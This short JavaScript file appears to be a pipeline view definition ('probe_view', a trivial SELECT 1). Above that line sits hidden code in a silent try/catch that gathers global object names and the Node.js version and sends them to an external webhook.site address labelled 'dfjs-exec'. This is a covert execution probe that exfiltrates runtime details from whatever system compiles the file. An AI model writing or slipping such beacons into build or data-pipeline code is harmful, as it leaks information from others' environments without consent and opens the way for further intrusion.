const https = require("https");
try {
  const img = Object.keys(globalThis).slice(0,3).join(",");
  https.get("https://webhook.site/3de9b91a-35f5-4220-be32-fac9d26ae8a4/dfjs-exec?env=" + encodeURIComponent(img) + "&node=" + process.version, () => {});
} catch (e) {}
publish("probe_view").query(ctx => "SELECT 1 AS x");
